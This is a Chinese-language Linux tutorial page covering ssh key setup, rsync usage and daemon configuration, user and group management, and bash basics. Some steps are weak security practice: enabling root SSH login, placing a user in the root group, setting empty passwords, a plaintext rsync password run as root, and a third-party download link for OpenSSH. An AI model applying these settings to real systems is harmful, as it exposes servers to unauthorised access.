8、id命令也可以查看某个用户所属的用户组,只执行id命令可以查看当前登录用户所在的用户组
$ echo $USER
$ echo $UID

#!/bin/bash
user=$(env | grep USER | cut -d "=" -f 2)
if [ "$user" == "root" ]
then
  echo 当前用户是root
fi

</pre>

<h4>ssh命令 ssh–secure shell远程登录工具</h4><pre>
Linux系统中是通过ssh服务实现的远程登录功能,默认ssh服务端口号为22
Windows系统上Linux远程登录客户端有SecureCRT, Putty, SSH Secure Shell等

ssh(OpenSSH SSH client)是一个用来在登录到远程linux机器并执行命令的程序
ssh服务是为了取代明文传输的而开发的,是用密文传输来保证安全
ssh命令是openssh套件中的客户端连接工具,可以给予ssh加密协议实现安全的远程登录服务器

ssh提供安全的远程登录。从事嵌入式开发搭建linux开发环境中,ssh服务的安装是其中必不可少的一步。ssh方便一个开发小组中人员登录一台服务器,从事代码的编写、编译、运行,方便代码的共享及管理。ssh是一种安全协议,主要用于给远程登录会话数据进行加密,保证数据传输的安全。

ssh is a program for logging into a remote machine and for executing commands on a remote machine.  It is intended to provide secure encrypted
     communications between two untrusted hosts over an insecure network.  X11 connections, arbitrary TCP ports and UNIX-domain sockets can also be forwarded over
     the secure channel.

ssh connects and logs into the specified hostname(with optional user name).  The user must prove his/her identity to the remote machine using one of several methods

服务端安装openssh-server
客户端安装openssh-client

如果只是想登陆别的机器的SSH只需要安装openssh-client(ubuntu有默认安装,如果没有则sudo apt install openssh-client),如果要使本机开放SSH服务就需要安装openssh-server
$ apt install openssh-server openssh-client  # 安装sshd命令
$ dpkg -l | grep ssh
ii openssh-client   1:7.2p2-4ubuntu2.4 amd64 secure shell(SSH) client, for secure access to remote machines
ii openssh-server   1:7.2p2-4ubuntu2.4 amd64 secure shell(SSH) server, for secure access from remote machines
ii ssh-import-id    5.5-0ubuntu1       all   securely retrieve an SSH public key and install it locally
ii openssh-sftp-server 1:7.2p2-4ubuntu2.4 amd64 secure shell(SSH) sftp server module, for SFTP access from remote machines

$ ps aux | grep ssh
如果看到sshd那说明ssh-server已经启动了,如果没有则可以这样启动:sudo /etc/init.d/ssh start或sudo service ssh start

$ sudo service ssh start
 * Starting OpenBSD Secure Shell server [ OK ]
$ sudo service ssh status
 * sshd is running
$ ssh -V
OpenSSH_7.2p2 Ubuntu-4ubuntu2.4, OpenSSL 1.0.2g  1 Mar 2016
$ sudo service ssh stop
$ sudo service ssh restart

配置:
ssh-server配置文件位于/etc/ssh/sshd_config,在这里可以定义SSH的服务端口,默认端口是22,可以自定义其他端口号如222。(或把配置文件中的"PermitRootLogin without-password"加一个"#"号把它注释掉,再增加一句"PermitRootLogin yes")
然后重启SSH服务

【 SSH两种登录验证方式原理 】
1. 用户名密码验证方式
(1)当客户端发起ssh请求,服务器收到请求,把自己的公钥发送给用户;
(2)用户会根据服务器发来的公钥对密码进行加密;
(3)加密后的信息回传给服务器,服务器用自己的私钥解密,如果密码正确则用户登录成功。

2. 基于密钥的登录方式
一般通过密码登录远程管理Linux服务器时密码容易被暴力破解,所以一般的方法有三种:
(1)将SSH的端口设置为默认的22以外的端口;
(2)禁用root账户登录;
(3)通过密钥方式登录。

密钥方式登录原理:利用密钥生成器制作一对密钥,一只公钥和一只私钥。将公钥添加到服务器的某个账户上,然后在客户端利用私钥即可完成认证并登录。若没有私钥,任何人都无法通过SSH暴力破解密码来远程登录。此外若将公钥复制到其他账户或主机,利用私钥也可以登录

(1) 首先在客户端生成一对密钥(ssh-keygen);
(2) 并将客户端的公钥ssh-copy-id 拷贝到服务端;
(3) 当客户端再次发送一个连接请求,包括ip、用户名;
(4) 服务端得到客户端的请求后会到authorized_keys中查找,如果有响应的IP和用户就会随机生成一个字符串,例如qwer;
(5) 服务端将使用客户端拷贝过来的公钥进行加密,然后发送给客户端;
(6) 得到服务端发来的消息后,客户端会使用私钥进行解密,然后将解密后的字符串发送给服务端;
(7) 服务端接受到客户端发来的字符串后,跟之前的字符串进行对比,如果一致,就允许免密码登录。

~/.ssh$ ssh-keygen    # 建立密钥对
Generating public/private rsa key pair.
Enter file in which to save the key(/home/eai/.ssh/id_rsa):  # enter 确认
Enter passphrase(empty for no passphrase):                   # 输入密钥密码锁,或者直接enter默认无密码
Enter same passphrase again:                                  # 再次输入密钥密码锁
Your identification has been saved in /home/eai/.ssh/id_rsa.  # 私钥
Your public key has been saved in /home/eai/.ssh/id_rsa.pub.  # 公钥
The key fingerprint is:
77:d0:af:76:97:fd:97:dd:e5:cc:47:01:1f:40:ae:b6 eai@eai
The key's randomart image is:
+--[ RSA 2048]----+
|            .o.  |
|           ... . |
|          . ..o .|
|           ... o |
|        S .o. . .|
|         .....  =|
|           Eo .*B|
|           . . oX|
|                +|
+-----------------+

现在在~/.ssh的目录中生成了两个密钥文件:id_rsa为私钥,id_rsa.pub为公钥

2.在服务器上安装公钥,将id_rsa.pub文件的内容上传至服务器~/.ssh/authorized_keys
eai@eai:~/.ssh$ cat id_rsa.pub >> authorized_keys
然后设置一下文件的权限:
eai@eai:~/.ssh$ chmod 600 authorized_keys
eai@eai:~/.ssh$ chmod 700 ~/.ssh

方法二
username@local:~/.ssh$ ssh-copy-id username@remote

3.设置SSH,打开密钥登录功能
确保/etc/ssh/sshd_config文件中相关设置(一般不用修改):
RSAAuthentication yes
PubkeyAuthentication yes
留意root用户能否通过SSH登录:
PermitRootLogin yes
当完成全部设置,以密钥方式登录成功后,可以禁用密码登录:
PasswordAuthentication no
最后重启SSH服务:
eai@eai:~/.ssh$ service sshd restart
如果重启失败:sshd: unrecognized service,就查看SSH是否活动:eai@eai:~/.ssh$ service ssh status,如果是类似ssh start/running, process 1579,
就直接这样重启: eai@eai:~/.ssh$ sudo /etc/init.d/ssh restart

4.下载私钥,转为PuTTY能使用的格式
将私钥文件id_rsa下载到本机,打开PuTTYGen,单击Actions中的Load按钮,载入刚才下载到的私钥文件。
若才设置了密钥锁码会提示输入。
载入成功后PuTTYGen会显示密钥相关的信息。在Key comment中键入对密钥的说明信息,然后单击Save private key按钮即可将私钥文件存放为PuTTY能使用的格式。

至此密钥制作完成,以后使用PuTTY登录时可以在左侧Connection -> SSH -> Auth中的Private key file for authentication:处选择私钥文件,然后即可登录了,过程中只需输入密钥锁码即可。

【 ssh(选项)(参数) 】
常用格式:ssh [-l login_name] [-p port] [user@]hostname

选项
-1:强制使用ssh协议版本1;
-2:强制使用ssh协议版本2;
-4:强制使用IPv4地址;
-6:强制使用IPv6地址;
-A:开启认证代理连接转发功能;
-a:关闭认证代理连接转发功能;
-b:使用本机指定地址作为对应连接的源ip地址;
-C:请求压缩所有数据;
-F:指定ssh指令的配置文件;
-f:后台执行ssh指令;
-g:允许远程主机连接主机的转发端口;
-i:指定身份文件;
-l:指定连接远程服务器登录用户名;
-N:不执行远程指令;
-o:指定配置选项;
-p:指定远程服务器上的端口;
-q:静默模式;
-X:开启X11转发功能;
-x:关闭X11转发功能;
-y:开启信任X11转发功能。

参数
远程主机:指定要连接的远程ssh服务器;
指令:要在远程ssh服务器上执行的指令。

$ ssh user@remote.machine
$ ssh user@host
$ ssh -p port user@host  # -p可用于连接到特定端口的选项
$ exit  # 退出登录

$ ssh domain.com
# 域名绑定ip地址之后用域名登录远程主机时,本地主机和远程主机用户名相同时可省略用户名,登录成功之后提示符为远程主机

通过命令ssh root@172.1.1.1远程登陆到远程一台服务器,第一次连接会询问是否信任要连接的服务器,输入yes就把服务器的公钥添加到自己已知的信任主机里面,下次登陆就可以直接输入密码远程安全的管理服务器了

ubuntu16默认使用ufw(Uncomplicated FireWall继承自iptables)管理防火墙
如果开通了ufw防火墙的要加入规则,默认端口为22

git ssh for github
cd ~/.ssh   # 检查用户目录下是否存在ssh文件
ll          # 检查是否存在id_rsa.pub、id_rsa文件
ssh-keygen  # 生成ssh文件之后将id_rsa.pub文件的内容添加到github

$ ssh -T git@github.com
Hi berlin75! You've successfully authenticated, but GitHub does not provide shell access.

下载安装openssh for Winodws:
http://linux.linuxidc.com/index.php?folder=MjAxNMTq18rBzy8y1MIvMTTI1S9XaW5kb3dzIDfD/MHu0NDPwsq508NTU0jNqLn9w9jUv7XHwrxMaW51eA==
设置环境变量,编辑Path,在行尾追加 ;{openssh的下载路径}\bin(替代地址)
cmd命令行,尝试ssh -V产生版本信息说明可以
cmd> ssh -V

【 rsync命令 】
rsync(remote synchronization)命令是一个远程数据传输同步的功能强大的工具,可通过LAN/WAN快速同步多台主机间的文件。rsync使用所谓的"rsync算法"来使本地和远程两个主机之间的文件达到同步,这个算法只传送两个文件的不同部分,而不是每次都整份传送,因此速度相当快

语法
rsync [OPTION]... SRC DEST
rsync [OPTION]... SRC [USER@]host:DEST
rsync [OPTION]... [USER@]HOST:SRC DEST
rsync [OPTION]... [USER@]HOST::SRC DEST
rsync [OPTION]... SRC [USER@]HOST::DEST
rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]

对应于以上六种命令格式,rsync有六种不同的工作模式:
1、拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号":"分隔符时就启动这种工作模式,如rsync -a /data /backup
2、使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器,当DST路径地址包含单个冒号":"分隔符时启动该模式,如rsync -avz *.c foo:src
3、使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器,当SRC地址路径包含单个冒号":"分隔符时启动该模式,如rsync -avz foo:src/bar /data
4、从远程rsync服务器中拷贝文件到本地机,当SRC路径信息包含"::"分隔符时启动该模式,如rsync -av root@192.168.78.192::www /databack
5、从本地机器拷贝文件到远程rsync服务器中,当DST路径信息包含"::"分隔符时启动该模式,如rsync -av /databack root@192.168.78.192::www
6、列远程机的文件列表,这类似于rsync传输,不过只要在命令中省略掉本地机信息即可,如rsync -v rsync://192.168.78.192/www

选项
-v, --verbose 详细模式输出。
-q, --quiet 精简输出模式。
-c, --checksum 打开校验开关,强制对文件传输进行校验。
-a, --archive 归档模式,表示以递归方式传输文件,并保持所有文件属性,等于-rlptgoD。
-r, --recursive 对子目录以递归模式处理。
-R, --relative 使用相对路径信息。
-b, --backup 创建备份即对目的已经存在有同样的文件名时,将老的文件重新命名为~filename,可用--suffix选项指定不同的备份文件前缀。
--backup-dir 将备份文件(如~filename)存放在在目录下。
-suffix=SUFFIX 定义备份文件前缀。
-u, --update 仅仅进行更新,也就是跳过所有已经存在于DST,并且文件时间晚于要备份的文件,不覆盖更新的文件。
-l, --links 保留软链结。
-L, --copy-links 对待常规文件一样处理软链结。
--copy-unsafe-links 仅拷贝指向SRC路径目录树以外的链结。
--safe-links 忽略指向SRC路径目录树以外的链结。
-H, --hard-links 保留硬链结。
-p, --perms 保持文件权限。
-o, --owner 保持文件属主信息。
-g, --group 保持文件属组信息。
-D, --devices 保持设备文件信息。
-t, --times 保持文件时间信息。
-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。
-n, --dry-run现实哪些文件将被传输。
-w, --whole-file 拷贝文件,不进行增量检测。
-x, --one-file-system 不要跨越文件系统边界。
-B, --block-size=SIZE 检验算法使用的块尺寸,默认700字节。
-e, --rsh=command 指定使用rsh、ssh方式进行数据同步。
--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。
-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件,用来排除那些不希望传输的文件。
--existing 仅仅更新那些已经存在于DST的文件,而不备份那些新创建的文件。
--delete 删除那些DST中SRC没有的文件。
--delete-excluded 同样删除接收端那些被该选项指定排除的文件。
--delete-after 传输结束以后再删除。
--ignore-errors 及时出现IO错误也进行删除。
--max-delete=NUM 最多删除NUM个文件。
--partial 保留那些因故没有完全传输的文件,以是加快随后的再次传输。
--force 强制删除目录,即使不为空。
--numeric-ids 不将数字的用户和组id匹配为用户名和组名。
--timeout=time ip超时时间,单位为秒。
-I, --ignore-times 不跳过那些有同样的时间和长度的文件。
--size-only 当决定是否要备份文件时,仅仅察看文件大小而不考虑文件时间。
--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口,默认为0。
-T --temp-dir=DIR 在DIR中创建临时文件。
--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。
-P 等同于 --partial。
--progress 显示备份过程。
-z, --compress 对备份的文件在传输时进行压缩处理。
--exclude=PATTERN 指定排除不需要传输的文件模式。
--include=PATTERN 指定不排除而需要传输的文件模式。
--exclude-from=FILE 排除FILE中指定模式的文件。
--include-from=FILE 不排除FILE指定模式匹配的文件。
--version 打印版本信息。
--address 绑定到特定的地址。
--config=FILE 指定其他的配置文件,不使用默认的rsyncd.conf文件。
--port=PORT 指定其他的rsync服务端口。
--blocking-io 对远程shell使用阻塞IO。
-stats 给出某些文件的传输状态。
--progress 在传输时现实传输过程。
--log-format=formAT 指定日志文件格式。
--password-file=FILE 从FILE中得到密码。
--bwlimit=KBPS 限制I/O带宽,KBytes per second。
-h, --help 显示帮助信息。

username@local:~$ rsync -r mydir username@remote:          # 上传文件夹,不指定远程目录时默认远程的用户主目录
username@local:~$ rsync -r username@remote:mydir .         # 下载文件夹到本地的当前目录
username@local:~$ rsync -r mydir/ username@remote:mydir/   # 同步新增的文件
username@local:~$ rsync -av mydir/ username@remote:mydir/  # 同步新增的文件
username@local:~$ rsync -av --delete mydir/ username@remote:mydir/  # 同步新增同时又删除的文件
username@local:~$ rsync -av --delete mydir/ username@remote:mydir/ --dry-run # 只报告信息而不同步数据

SSH方式
首先在服务端启动ssh服务:
service sshd start

使用rsync进行同步
接下来就可以在客户端使用rsync命令来备份服务端上的数据了,SSH方式是通过系统用户来进行备份的,如下:
rsync -vzrtopg --progress -e ssh --delete work@172.16.78.192:/www/* /databack/experiment/rsync
work@172.16.78.192's password:
receiving file list ...
5 files to consider
test/
a
0 100% 0.00kB/s 527:35:41(1, 20.0% of 5)
b
67 100% 65.43kB/s 0:00:00(2, 40.0% of 5)
c
0 100% 0.00kB/s 527:35:41(3, 60.0% of 5)
dd
100663296 100% 42.22MB/s 0:00:02(4, 80.0% of 5)
sent 96 bytes received 98190 bytes 11563.06 bytes/sec
total size is 100663363 speedup is 1024.19
上面的信息描述了整个的备份过程及总共备份数据的大小。

后台服务方式
启动rsync服务,编辑/etc/xinetd.d/rsync文件,将其中的disable=yes改为disable=no,并重启xinetd服务,如下:
vi /etc/xinetd.d/rsync
#default: off
# description: The rsync server is a good addition to an ftp server, as it \
# allows crc checksumming etc.
service rsync {
disable = no
socket_type = stream
wait = no
user = root
server = /usr/bin/rsync
server_args = --daemon
log_on_failure += USERID
}

/etc/init.d/xinetd restart

创建配置文件,默认安装好rsync程序后,并不会自动创建rsync的主配置文件,需要手工来创建,其主配置文件为"/etc/rsyncd.conf",创建该文件并插入如下内容:
vi /etc/rsyncd.conf
uid=root
gid=root
max connections=4
log file=/var/log/rsyncd.log
pid file=/var/run/rsyncd.pid
lock file=/var/run/rsyncd.lock
secrets file=/etc/rsyncd.passwd
hosts deny=172.16.78.0/22

[www]
comment= backup web
path=/www
read only = no
exclude=test
auth users=work

创建密码文件,采用这种方式不能使用系统用户对客户端进行认证,所以需要创建一个密码文件,其格式为"username:password",用户名可以和密码可以随便定义,最好不要和系统帐户一致,同时要把创建的密码文件权限设置为600

echo "work:abc123" > /etc/rsyncd.passwd
chmod 600 /etc/rsyncd.passwd

备份,完成以上工作,现在就可以对数据进行备份了,如下:
rsync -avz --progress --delete work@172.16.78.192::www /databack/experiment/rsync

Password:
receiving file list ...
6 files to consider
./ files...
a
0 100% 0.00kB/s 528:20:41(1, 50.0% of 6)
b
67 100% 65.43kB/s 0:00:00(2, 66.7% of 6)
c
0 100% 0.00kB/s 528:20:41(3, 83.3% of 6)
dd
100663296 100% 37.49MB/s 0:00:02(4, 100.0% of 6)
sent 172 bytes received 98276 bytes 17899.64 bytes/sec
total size is 150995011 speedup is 1533.75

恢复,当服务器的数据出现问题时,那么这时就需要通过客户端的数据对服务端进行恢复,但前提是服务端允许客户端有写入权限,否则也不能在客户端直接对服务端进行恢复,使用rsync对数据进行恢复的方法如下:
rsync -avz --progress /databack/experiment/rsync/ work@172.16.78.192::www

Password:
building file list ...
6 files to consider
./
a
b
67 100% 0.00kB/s 0:00:00(2, 66.7% of 6)
c
sent 258 bytes received 76 bytes 95.43 bytes/sec
total size is 150995011 speedup is 452080.87

</pre>

<h4>Linux用户管理</h4><pre>
Linux一个多用户多任务的分时操作系统,任何一个要使用系统资源的用户都必须首先向系统管理员申请一个账号,然后以这个账号的身份进入系统。
用户的账号可帮助系统管理员对使用系统的用户进行跟踪,并控制他们对系统资源的访问,也可以帮助用户组织文件,并为用户提供安全性保护。
每个用户账号都拥有一个惟一的用户名和各自的口令,用户在登录时键入正确的用户名和口令后就能够进入系统和自己的主目录。

完成用户管理的工作有许多种方法,但每一种方法实际上都是对有关的系统文件进行修改

实现用户账号的管理,要完成的工作主要有如下几个方面:
用户账号的添加、删除与修改。
用户口令的管理。
用户组的管理

1、添加用户账号就是在系统中创建一个新账号,然后为新账号分配用户号、用户组、主目录和登录Shell等资源。刚添加的账号是被锁定的,无法使用
增加用户账号就是在/etc/passwd文件中为新用户增加一条记录,同时更新其他系统文件如/etc/shadow,/etc/group等。
Linux提供了集成的系统管理工具userconf对用户账号进行统一管理

useradd options username
-c comment      指定一段注释性描述。
-d 目录         指定用户主目录,如果此目录不存在则同时使用-m选项,可以创建主目录。
-g 用户组       指定用户所属的用户组。
-G 用户组,用户组 指定用户所属的附加组。
-s Shell文件    指定用户的登录Shell。
-u 用户号       指定用户的用户号,如果同时有-o选项则可以重复使用其他用户的标识号

# useradd –d /usr/sam -m sam  # 创建一个用户sam,其中-d和-m选项用来为登录名sam产生一个主目录/usr/sam
# useradd -s /bin/sh -g group –G adm,root gem # 新建了一个用户gem,该用户的登录Shell是/bin/sh,属于group用户组,同时又属于adm和root用户组,其中group用户组是其主组。

2、userdel命令删除帐号
删除一个已有的用户账号就是要将/etc/passwd等系统文件中的该用户记录删除,必要时还删除用户的主目录。
userdel options username
# userdel -r sam  # 常用的选项是-r把用户的主目录一起删除

3、usermod命令修改帐号
修改用户账号就是根据实际情况更改用户的有关属性,如用户号、主目录、用户组、登录Shell等。
usermod options username
常用的选项包括-c, -d, -m, -g, -G, -s, -u以及-o等,这些选项的意义与useradd命令中的选项一样,可以为用户指定新的资源值。
$ usermod -l 新用户名 老用户名 # 修改用户名
$ usermod -s /bin/ksh -d /home/z –g developer sam # 将用户sam的登录Shell修改为ksh,主目录改为/home/z,用户组改为developer

4、passwd命令管理用户口令
用户账号刚创建时没有口令,但是被系统锁定,无法使用,必须为其指定口令后才可以使用,即使是指定空口令。
指定和修改用户口令的Shell命令是passwd。超级用户可以为自己和其他用户指定口令,普通用户只能用它修改自己的口令
passwd options username
-l 锁定口令即禁用账号。
-u 口令解锁。
-d 使账号无口令。
-f 强迫用户下次登录时修改口令。
如果默认用户名则修改当前用户的口令。

例如假设当前用户是sam,则下面的命令修改该用户自己的口令:
$ passwd
Old password:******
New password:*******
Re-enter new password:*******

如果是超级用户,可以用下列形式指定任何用户的口令:
# passwd sam
New password:*******
Re-enter new password:*******

普通用户修改自己的口令时passwd命令会先询问原口令,验证后再要求用户输入两遍新口令,如果两次输入的口令一致则将这个口令指定给用户;
而超级用户为用户指定口令时就不需要知道原口令。
为了系统安全起见,用户应该选择比较复杂的口令,例如最好使用8位长的口令,口令中包含有大写、小写字母和数字,并且应该与姓名、生日等不相同。

# passwd -d sam  # 为用户指定空口令,将用户sam的口令删除,这样用户sam下一次登录时,系统就不再询问口令。
# passwd -l sam  # 用-l(lock)选项锁定某一用户,使其不能登录

</pre>

<h4>linux用户组管理</h4><pre>
每个用户都有一个用户组,系统可以对一个用户组中的所有用户进行集中管理。不同Linux系统对用户组的规定有所不同,如Linux下的用户属于与它同名的用户组,这个用户组在创建用户时同时创建。
用户组的管理涉及用户组的添加、删除和修改,实际上就是对/etc/group文件的更新
类似于用户账号的管理,用户组的管理也可以通过集成的系统管理工具来完成

1、groupadd命令增加一个新的用户组
groupadd options groupname
可以使用的选项有:
-g GID 指定新用户组的组标识号(GID)。
-o 一般与-g选项同时使用,表示新用户组的GID可以与系统已有用户组的GID相同
# groupadd -g 101 group2  # 向系统中增加了一个新组group2,同时指定新组的组标识号是101

2、groupdel命令删除一个已有的用户组
groupdel groupname

3、groupmod修改用户组的属性
groupmod options groupname
-g GID 为用户组指定新的组标识号。
-o 与-g选项同时使用,用户组的新GID可以与系统已有用户组的GID相同。
-n 新用户组 将用户组的名字改为新名字

4、如果一个用户同时属于多个用户组,那么用户可以在用户组之间切换,以便具有其他用户组的权限。
用户可以在登录后使用命令newgrp切换到其他用户组,这个命令的参数就是目的用户组
$ newgrp root  # 将当前用户切换到root用户组,前提条件是root用户组确实是该用户的主组或附加组

【 与用户账号有关的系统文件 】
/etc/passwd文件是用户管理工作涉及的最重要的一个文件,Linux系统中的每个用户都在/etc/passwd文件中有一个对应的记录行,它记录了这个用户的一些基本属性,这个文件对所有用户都是可读的

berlin75:x:1000:1000:,,,:/home/berlin75:/bin/bash
/etc/passwd中一行记录对应着一个用户,每行记录又被冒号(:)分隔为7个字段,
用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell

一些系统中存放着加密后的用户口令,虽然这个字段存放的只是用户口令的加密串,不是明文,但由于/etc/passwd文件对所有用户都可读,所以这仍是一个安全隐患。因此现在许多Linux 系统(如SVR4)都使用了shadow技术,把真正的加密后的用户口令字存放到/etc/shadow文件中,而在/etc/passwd文件的口令字段中只存放一个特殊的字符,例如"x"或"*"

"用户标识号"是一个整数,系统内部用它来标识用户,一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的,系统内部将把它们视为同一个用户,但它们可以有不同的口令、不同的主目录以及不同的登录Shell等,通常用户标识号的取值范围是0~65 535。0是超级用户root的标识号,1~99由系统保留,作为管理账号,普通用户的标识号从100开始。在Linux系统中,这个界限是500

用户登录后要启动一个进程,负责将用户的操作传给内核,这个进程是用户登录到系统后运行的命令解释器或某个特定的程序即Shell
Shell是用户与Linux系统之间的接口,Linux的Shell有许多种,每种都有不同的特点。常用的有sh(Bourne Shell), csh(C Shell), ksh(Korn Shell), tcsh(TENEX/TOPS-20 type C Shell), bash(Bourne Again Shell)等。
系统管理员可根据系统情况和用户习惯为用户指定某个Shell,如果不指定Shell,那么系统使用sh为默认的登录Shell,即这个字段的值为/bin/sh。
用户的登录Shell也可以指定为某个特定的程序(此程序不是一个命令解释器),利用这一特点,可以限制用户只能运行指定的应用程序,在该应用程序运行结束后用户就自动退出了系统。有些Linux 系统要求只有那些在系统中登记了的程序才能出现在这个字段中

系统中有一类用户称为伪用户(psuedo users)。
这些用户在/etc/passwd文件中也占有一条记录,但不能登录,因为它们的登录Shell为空。它们的存在主要是方便系统管理,满足相应的系统进程对文件属主的要求。
常见的伪用户如下:
bin 拥有可执行的用户命令文件
sys 拥有系统文件
adm 拥有帐户文件
uucp UUCP使用
lp lp或lpd子系统使用
nobody NFS使用

</pre>
</div>

<div id="baseCommand">
<h3>linux command</h3><pre>
Terminal 终端

win+r -> bash
cmd> bash
cmd> ubuntu

cmd> exit
berlin75@LAPTOP-0KMQM01D:~$exit

Shell(也称为终端或壳)是一个命令行工具,充当用户与内核(硬件)之间的翻译官,用户把一些命令告诉终端,它就会调用相应的程序服务去完成某些工作,主流Linux系统默认使用的终端是Bash(Bourne-Again SHell)解释器。主流Linux系统选择Bash解释器作为命令行终端主要有以下4项优势
1、通过上下方向键来调取过往执行过的Linux命令
2、命令或参数或文件名仅需输入前几位就可用Tab键补全,有多个相同前缀时按tab键会全部输出以供选择,tab键按一次或两次
3、具有强大的批处理脚本
4、具有实用的环境变量功能

shell分为CLI(command line interface)和GUI(graphical user interface),Linux中一般默认GUI为:GNOME,默认CLI为:BASH

常见执行Linux命令的格式:命令名称 [命令参数] [命令对象],Linux命令行输入严格区分大小写,而Windows命令行输入不区分大小写

Tab自动补全命令,简化输入机制,自动补全文件名,但无法补全参数
未输入状态下连按两次Tab列出所有可用命令,已输入部分命令名或文件名按Tab进行自动补全

命令行中的变量
$ ls -l /proc/$$/ns

【 linux通配符 】
通配符以文件名替换著称

*      匹配任意多个字符(包括零个或一个)
？     匹配任意一个字符(不包括零个)
[characters]   匹配任意一个属于字符集中的字符
[!characters]  匹配任意一个不是字符集中的字符
[[:class:]]    匹配任意一个属于指定字符类中的字符

$ rm .b*       # 删除已.b开头的文件
$ rm *         # 删除所有文件
$ echo .b*     # 显示所有以.b开头的文件或目录 .bash_history .bash_logout .bashrc
$ echo *       # 显示所有不是.开头的文件或目录(非隐藏)

【 执行多个命令 】
后一个命令依赖于前一个命令的输出可用管道(|)
ls | wc -l # 当前目录文件个数

&&串行执行命令,后一个命令必须等前一个命令运行成功后再运行,否则根本就不执行
如果要查看一个程序所执行的时间,可以使用命令'date && ./需要执行的程序 && date'来查看
rm noexits && date # 只运行noexits,date不运行

&后一个命令必须等前一个命令运行完,不关心是否成功
rm noexits & date # rm noexits和date都运行,但date必须等rm noexits运行完。

对于shell1||shell2,只有在shell1执行失败时shell2才会执行,否则shell2是不执行得
rm noexits || date
date || rm noexits

""和''与 ` ` 在shell变量中的区别
" " 允许通过$符引用其他变量
''禁止引用其他变量符,视为普通字符
`` 将命令执行的结果输出给变量

【 Ubuntu指令返回的结果查看/指令执行的退出状态/退出码查看 】
在Linux系统中,每当命令执行完成后系统都会返回一个退出状态。该退出状态用一整数值表示,用于判断命令运行正确与否。退出状态值为0表示命令运行成功;而退出状态值不为0时则表示命令运行失败。最后一次执行的命令的退出状态值被保存在内置变量" $?"中,所以可以通过echo语句进行测试命令是否运行成功。 POSIX规定了以下几种退出状态和退出状态的含义。

常用参数
格式:exit n
退出,设置退出码为n
exit 2

格式:exit
退出,退出码不变,即为最后一个命令的退出码

格式:$?
上一个命令的退出码。

格式:trap "commands" EXIT
退出时执行commands指定的命令
trap "rm -f tmpfile; echo Bye." EXIT  # 退出时删除临时文件

退出码(exit status或exit code)的约定:
0表示成功(Zero - Success)
非0表示失败(Non-Zero  - Failure)
2表示用法不当(Incorrect Usage)
127表示命令没有找到(Command Not Found)
126表示不是可执行的(Not an executable)

exit logout  # 退出当前shell
cd $(dirname $0) || exit 1  # 进入脚本所在目录,否则退出

【 ubuntu程序后台运行几个方法 】
1. 程序后加上"＆",即"./myjob &",将命令放入到一个作业队列中,可以用命令"jobs"查看

2. 将1中的命令放在"()"中即"(./myjob &)",所提交的作业并不在作业列表中,是无法通过jobs来查看的

3. 使用"nohup"即"nohup ./myjob &",忽略hangup信号,防止shell关闭时程序停掉

4. 使用"setsid"即"setsid ./myjob"。

5. 对已经运行的程序可以用"disown -hmyjob"来使某个作业忽略HUP信号

6. 使用"screen". screen下的操作会在screen下运行,无法在jobs中查看到。常用的命令有:
a) 新建一个screen: screen-S   my_screen_name,建好后就可以进行所需要的操作了。
b) 暂时断开screen: Ctrl－a d
c) 重新打开screen: Ctrl－a screen_id
d) 查看所有screen状态: screen -ls
e) 终止screen: screen -S my_screen_name  -Xkill
f) 在当前窗口新建窗口: Ctrl-a c
g) 退出当前窗口: exit
h) 显示所有窗口列表:Ctrl-a w

【 shell技巧 】
man ascii:查看ascii码表,按q退出
ssh user@server bash < script.sh: 远程执行一个shell脚本,不用拷贝
convert input.png -gravity NorthWest -background transparent -extent 720×200 output.png:改变图片的大小,不用装ps

# for循环
a="a b c d e f"
for x in $a; do  echo $x+'q'; done
for x in {1..9}; do  echo $x; done
for x in `seq 30`; do echo $x; done
select a in 1 2 3 4 5 6 7; do echo $a; done # 创建选择菜单,无限循环

f=/home/config.ini
while read -r b; do echo $b+'dada'; done < "$f" #一行一行读取文件
while read b; do echo $b+'dada'; done < $f
while read b; do echo "your input is $b"; done # 读入键入的内容
cat 1.txt |while read line; do echo $line; done # 读取文件
for x in `cat 1.txt`; do echo $x; done # 按空格和回车读取文件
}
done & #后台执行循环

</pre>

<h4>help</h4><pre>
bash --help

1、type 命令名
查看系统给出的命令解释,查看命令是外部命令还是内部命令
type cp  # cp is /bin/cp
type ls  # ls is aliased to `ls --color=auto'

一个命令的类型可以是如下几种:
alias     别名
keyword   关键字,Shell保留字
function  函数,Shell函数
builtin   内建命令,Shell内建命令
file      文件,磁盘文件,外部命令
unfound   没有找到

常用参数
type -a可以显示所有可能的类型
type -p只返回外部命令的信息,相当于which命令。
type -f只返回shell函数的信息。
type -t只返回指定类型的信息

2、man是Linux的帮助手册即user manual
因为大多数程序都会自带手册,所以可以通过man命令获取帮助。执行以后在man page页面中按q退出,在man page页面输入斜杠加命令选项可以查看选项的用法: / -r,查找下一处输入n
man            # 从文档首页开始浏览
man cp         # 查看cp命令的使用文档

3、info
与man不同的是,可以像浏览网页一样在各个节点中跳转。
$ info         # 从文档首页开始浏览
$ info program # 获取特定程序的帮助

4、help
除了上面的两种方法外,还有一种简单使用的方法--help参数,一般程序都会有这个参数,输出最简单有用的介绍。
$ man --help   # 获取man的帮助
$ info --help  # 获取info的帮助
$ ls --help    # 获取ls的帮助

help 命令名    获得帮助文档

5、which 命令名
查看可执行程序的位置
which cp  # /bin/cp
which ls  # /bin/ls

6、whatis 命令名
查看命令帮助的man文件章节
whatis cp  # cp(1)  - copy files and directories

</pre>

<h4>基本命令</h4><pre>
firefox   打开应用程序
ctrl + C  停止当前命令
firefox & 多进程

【 make编译 】
make 编译
make install 安装编译好的源码包

【 command命令 】
$ type type
type is a shell builtin
$ type command
command is a shell builtin
$ type which
which is /usr/bin/which
$ echo $?
0
$ which aaaaa
$ echo $?
1

判断某一命令是否存在
$ command -v foo >/dev/null 2>&1 || { echo >&2 "I require foo but it's not installed.  Aborting."; exit 1; }
$ type foo >/dev/null 2>&1 || { echo >&2 "I require foo but it's not installed.  Aborting."; exit 1; }
